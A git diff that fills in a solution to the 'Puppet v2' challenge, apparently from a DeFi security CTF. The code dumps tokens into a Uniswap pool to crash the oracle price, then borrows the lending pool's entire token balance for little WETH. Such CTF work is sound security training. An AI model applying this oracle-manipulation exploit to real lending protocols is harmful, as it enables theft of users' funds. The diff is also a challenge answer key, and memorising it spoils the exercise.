@@ -83,6 +83,22 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        
+        // Convert most of player's ETH to WETH
+        const WETH_AMOUNT = 199n * 10n ** 17n;
+        await weth.connect(player).deposit({value: WETH_AMOUNT});
+
+        // Sell all tokens into the uniswap pool to drop the token price
+        const timestamp = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp;
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapRouter.connect(player).swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, 0, [token.address, weth.address], player.address, timestamp + 10);
+
+        // User approves WETH to be transferred to pool
+        const USER_WETH_BALANCE = await weth.balanceOf(player.address);
+        await weth.connect(player).approve(lendingPool.address, USER_WETH_BALANCE);
+
+        // User borrows all tokens from pool
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
